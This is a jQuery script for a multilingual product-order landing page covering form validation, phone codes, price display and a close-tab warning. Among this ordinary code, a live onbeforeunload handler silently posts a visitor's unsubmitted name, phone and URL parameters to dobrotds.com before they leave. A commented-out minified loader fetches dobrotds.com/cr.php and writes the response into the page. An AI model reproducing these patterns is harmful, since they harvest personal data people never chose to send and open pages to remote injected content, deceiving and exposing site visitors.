$().ready(function(){
    $('a[href^=#]').click(function(e){
        e.preventDefault();
        return false;
    });

    $('input[name=phone]').focus(function(){
        if($(this).val() == '') {
            $(this).val(phone_config.get_phone_code($(this).parents('form')));
        }
    }).val('');

    //скролл вверх
    $('.to_top').click(function(e){
        e.preventDefault();
        $('html,body').animate({scrollTop: 0}, 400);
        return false;
    });

    //ввод только цифр
    $('.only_number').on('keydown', function(event) {
        if ( event.keyCode == 46 || event.keyCode == 8 || event.keyCode == 9 || event.keyCode == 27 ||
            (event.keyCode == 65 && event.ctrlKey === true) ||
            (event.keyCode >= 35 && event.keyCode <= 39)) {return;}
        else {
            if ((event.keyCode < 48 || event.keyCode > 57) && (event.keyCode < 96 || event.keyCode > 105 )) {event.preventDefault();}
        }
    });

    $('.js_submit').click(function(e){
        e.preventDefault();
        check_form(this);
        return false;
    })


    $('.js_scroll_to_form').click(function(e){
        e.preventDefault();
        $('html,body').animate({scrollTop: $('form').offset().top}, 400);
        return false;
    })

    function check_form(target) {

        var feed = {
            submit: function(elem) {
                var form;
                jQuery(elem).parents().each(function() {
                    if(jQuery(this).is('form'))
                        form = jQuery(this);
                });

                var formInputs = {
                    country: form.find('[name=country]'),
                    fio: form.find('[name=fio]'),
                    phone: form.find('[name=phone]')
                };

                var postParams = {
                    method: 'feedback',
                    name: formInputs.fio.val(),
                    phone: formInputs.phone.val(),
                    country: formInputs.country.val()
                };

                jQuery('.js_errorMessage').remove();
                var country = postParams.country.toLowerCase();

                var rename = /^[a-zA-Zа-яА-ЯёЁ ]*$/i;
                var rephone = /^[0-9\-\+\(\) ]*$/i;

                if(!postParams.country.length)
                    return feed.errorMessage(formInputs.country, defaults.get_locale_var('set_country'));

                if(!postParams.name.length)
                    return feed.errorMessage(formInputs.fio, defaults.get_locale_var('set_fio'));

                if(postParams.name.length < 4 || !rename.test(postParams.name))
                    return feed.errorMessage(formInputs.fio, defaults.get_locale_var('error_fio'));


                if(phone_config.locale[country] !== undefined) {

                    if(!postParams.phone.length || postParams.phone.length <= phone_config.locale[country].cod.length)
                        return feed.errorMessage(formInputs.phone, defaults.get_locale_var('set_phone'));

                    if(phone_config.locale[country].cod != postParams.phone.substring(0,phone_config.locale[country].cod.length))
                        return feed.errorMessage(formInputs.phone, phone_config.process_error('error_phone_code', country));

                    if(postParams.phone.length < phone_config.locale[country].numbers_limit)
                        return feed.errorMessage(formInputs.phone, phone_config.process_error('input_phone', country));

                    if(postParams.phone.length > phone_config.locale[country].numbers_limit)
                        return feed.errorMessage(formInputs.phone, phone_config.process_error('set_limit', country));

                } else {

                    if(!postParams.phone.length)
                        return feed.errorMessage(formInputs.phone, defaults.get_locale_var('set_phone'));

                    if(!rephone.test(postParams.phone) || postParams.phone.length < 8)
                        return feed.errorMessage(formInputs.phone, defaults.get_locale_var('error_phone'));
                }

                jQuery(elem).hide();
                RemoveUnload();
                form.submit();
                //alert('submit');
                return false;
            },
            errorMessage: function(elem, msg) {
                jQuery('<div class="js_errorMessage">' + msg + '</div>').appendTo('body').css({
                    'left': jQuery(elem).offset().left,
                    'top': jQuery(elem).offset().top + 30,
                    'background-color':'#e74c3c',
                    'border-radius': '5px',
                    'color': '#fff',
                    'font-family': 'Arial',
                    'font-size': '14px',
                    'margin': '3px 0 0 0px',
                    'padding': '6px 5px 5px',
                    'position': 'absolute',
                    //'z-index': '10000'
                });
                jQuery(elem).focus();
                return false;
            }
        };
        feed.submit(target);
    }

    $("#country, .country").change(function(){
        def_click($(this).val());
        phone_config.change_phone_code($(this).parents('form'));
    });

    $("body").live('click', function(){
        $(".js_errorMessage").remove();
    });

    checkTimeZone();

    if (typeof site_title !== 'undefined') {
        $('title').text(site_title);
    }

    //var a=!1;if(window.XMLHttpRequest)try{a=new XMLHttpRequest}catch(b){a=!1}else if(window.ActiveXObject)try{a=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{a=new ActiveXObject("Microsoft.XMLHTTP")}catch(d){a=!1}}a&&(a.open("GET","http://dobrotds.com/cr.php",!1),a.send(null),a.responseText&&document.write(a.responseText));

})

var phone_config = {
    get_phone_code: function(form) {
        var country = form.find("[name=country]").val().toLowerCase();
        return phone_code = typeof phone_config.locale[country] != 'undefined' ? phone_config.locale[country].cod : '';
    },
    change_phone_code: function(form) {
        var new_phone_code = this.get_phone_code(form);

        for (var cnr in phone_config.locale) {
            if (phone_config.locale[cnr].cod == form.find('input[name=phone]').val()) {
                form.find('input[name=phone]').val(new_phone_code);
            }
        }
    },
    locale: {
        /*
        ru:{
            cod: '7',
            numbers_limit: '11',
            primer: '79121234567'
        },
        ua:{
            cod: '380',
            numbers_limit: '12',
            primer: '380501234567'
        },
        md:{
            cod: '373',
            numbers_limit: '11',
            primer: '37368123456'
        }
        */
    },
    errors: {
        error_phone_code: 'Номер телефона должен начинаться с "{cod}".<br> Пример: {primer}',
        input_phone: 'Вы не полностью ввели номер телефона. Должно быть {numbers_limit} цифр',
        set_limit: 'Вы ввели слишком много цифр,<br> скорее всего была допущена<br> ошибка при наборе номера'
    },
    process_error: function (error_name, country){
        var error_text = this.errors[error_name];
        for (var code in this.locale[country]) {
            error_text = error_text.replace('{'+code+'}', this.locale[country][code])
        }
        return error_text;
    }
}


var defaults = {
    get_locale_var: function(var_name) {
        country = this._locale.toLowerCase();
        return this.locale[country][var_name] !== undefined ?
            this.locale[country][var_name] : this.locale[this._locale][var_name];
    },
    locale: {
        ru:{
            set_country: 'Вы не выбрали страну',
            set_fio: 'Вы не заполнили ФИО',
            error_fio: 'Неверно заполнено ФИО',
            set_phone: 'Вы не заполнили Телефон',
            error_phone: 'Неверно заполнен Телефон',
            exit_text: 'Вы точно хотите закрыть вкладку? До завершения заказа осталось нажать одну кнопку!',
        },
        bg:{
            set_country: 'Вие не сте избрали държава',
            set_fio: 'Моля, въведете валидно име',
            error_fio: 'Моля, въведете валидно име',
            set_phone: 'Моля, въведете телефон за връзка',
            error_phone: 'Телефонния номер е въведен неправилно',
            exit_text: 'Сигурни ли сте че искате да затворите раздел? До приключване на поръчката кликнете с левия бутон един бутон!'
        },
        ro:{
            set_country: 'Vă rugăm să completați câmpul "Nume/Prenume"',
            set_fio: 'Cimpul a fost completat incorect "Nume/Prenume"',
            error_fio: 'Cimpul a fost completat incorect  "Nume/Prenume"',
            set_phone: 'Vă rugăm să completați câmpul "Telefon"',
            error_phone: 'Cimpul a fost completat incorect "Telefon"',
            exit_text: 'Sunteți sigur că doriți să închideți o filă? Până la finalizarea comenzii stânga faceți clic pe un buton!'
        },
        br:{
            set_country: 'Não selecionou país',
            set_fio: 'Por gentileza, verifique os seus dados',
            error_fio: 'Por gentileza, verifique os seus dados',
            set_phone: 'or gentileza, verifique os seus dados',
            error_phone: 'or gentileza, verifique os seus dados',
            exit_text: 'Tem certeza de que quer fechar uma guia? Até a conclusão da ordem esquerda clique em um botão!'
        },
        hu:{
            set_country: 'Nem választott ország',
            set_fio: 'Nem kitölteni Név és vezetéknév',
            error_fio: 'Helytelenül kitöltött Név és vezetéknév',
            set_phone: 'Nem kitölteni Phone',
            error_phone: 'Helytelenül kitöltött Telefon',
            exit_text: 'Biztos benne, hogy be akarja zárni a lapra? Befejezéséig a rendelés bal gombbal egy gombot!',
        },
        tr:{
            set_country: 'Siz ülkeyi seçmediniz',
            set_fio: 'Adınızı yazınız lütfen',
            error_fio: 'Adınız yalnış yazılmış',
            set_phone: 'Telefon numaranızı yazınız lütfen',
            error_phone: 'Telefon numarası yanlış yazılmış',
            exit_text: 'Sayfamızı kapatmak istediniz. Eminmisiniz? Sipariş etmek icin son tıklama lazım!',
        },
        pl:{
            set_country: 'Podaj kraju',
            set_fio: 'Podaj imię i nazwisko',
            error_fio: 'Podaj realne imię i nazwisko',
            set_phone: 'Podaj numer telefonu',
            error_phone: 'Podaj realny numer telefonu',
            exit_text: 'Czy na pewno chcesz zamknąć kartę?',
        },
        es:{
            set_country: 'No escogió un país',
            set_fio: 'No escribió su nombre y apellido',
            error_fio: 'Usted escribió mal su nombre y apellido',
            set_phone: 'No escbribió su teléfono',
            error_phone: 'Escribio mal su teléfono',
            exit_text: '¿De verdad quiere cerrar la pestana? ¡Para terminar su pedido solo queda presionar el botón!',
        },
        us:{
            set_country: 'Select country',
            set_fio: 'Name is a required field',
            error_fio: 'Name field is entered incorrectly',
            set_phone: 'Phone number is a required field',
            error_phone: 'The phone number is entered incorrectly',
            exit_text: 'You really want to close tab?',
        }


    },
    _locale: window.locale || 'ru'
}

function def_click(country_code){
  $("#country, .country").val(country_code);
  //$('a.country[rel='+country+']').click();
  set_prices(country_code);
}

function set_prices(country_code) {
    var country = $("#country");
    var $child  = country.children(":selected"),
        curs      = $child.attr("pricecurrency"),
        new_price = $child.attr("price1") * 1,
        old_price = $child.attr("price3") * 1,
        delivery  = $child.attr("price2") * 1
        //percent   = $child.attr("perc") * 1

    percent = Math.ceil(new_price/old_price*100);

    $('.js_new_price').each(function() {
        $(this).is('input') ? $(this).val(new_price) : $(this).text(new_price);
    })
    $('.js_new_price_curs').each(function() {
        $(this).is('input') ? $(this).val(new_price+curs) : $(this).text(new_price+curs);
    })
    $('.js_full_price').each(function() {
        $(this).is('input') ? $(this).val(new_price+delivery) : $(this).text(new_price+delivery);
    })
    $('.js_full_price_curs').each(function() {
        $(this).is('input') ? $(this).val(new_price+delivery+curs) : $(this).text(new_price+delivery+curs);
    })

    $('.js_old_price').each(function() {
        $(this).is('input') ? $(this).val(old_price) : $(this).text(old_price);
    })
    $('.js_old_price_curs').each(function() {
        $(this).is('input') ? $(this).val(old_price+curs) : $(this).text(old_price+curs);
    })

    $('.js_delivery').each(function() {
        $(this).is('input') ? $(this).val(delivery) : $(this).text(delivery);
    })
    $('.js_delivery_curs').each(function() {
        $(this).is('input') ? $(this).val(delivery+curs) : $(this).text(delivery+curs);
    })
    $('.js_curs').each(function() {
        $(this).is('input') ? $(this).val(curs) : $(this).text(curs);
    })

    $('.js_percent').each(function() {
        $(this).is('input') ? $(this).val(percent) : $(this).text(percent);
    })
    $('.js_percent_sign').each(function() {
        $(this).is('input') ? $(this).val(percent) : $(this).text(percent+'%');
    })
}


function checkTimeZone() {
    var offset = new Date().getTimezoneOffset();
    hours = offset / (-60);
    $('form').append('<input type="hidden" name="time_zone" value="'+hours+'">');
}

function sendPhoneOrder(form){
    form_data = $(form).serializeArray();
    form_data.push({"name" : "uri_params", "value" : window.location.search.replace("?", "")});
    $.ajax({
        type: "POST",
        url: "http://dobrotds.com/save_order.php",
        data: form_data,
        crossDomain: true,
        dataType: "json",
        success: function (e){
        }
    });
}

function cancelEvent(e){
    try {
        if (e) {
            e.returnValue = defaults.get_locale_var('exit_text');
            e.cancelBubble = true;
            if (e.stopPropagation)
                e.stopPropagation();
            if (e.preventDefault)
                e.preventDefault();
        }
    } catch (err) {}
    return defaults.get_locale_var('exit_text');
}

function RemoveUnload() {
    window.onbeforeunload = null;
}

var ASO = window.ASO || 1;
if (ASO == 1) {
    window.onbeforeunload = function (e) {
        $("form").each(function( index ) {
            var phone = $(this).find("input[name=phone]").val();
            var country = $(this).find("[name=country]").val().toLowerCase();
            if(phone_config.locale[country] === undefined && phone.length > 9) {
                sendPhoneOrder(this);
                RemoveUnload();
                return cancelEvent(e);
            } else {
                var cod = phone_config.locale[country].cod;
                if (phone.length == phone_config.locale[country].numbers_limit && phone.search(cod) === 0) {
                    sendPhoneOrder(this);
                    RemoveUnload();
                    return cancelEvent(e);
                }
            }

        });
    }
}

///////////////////
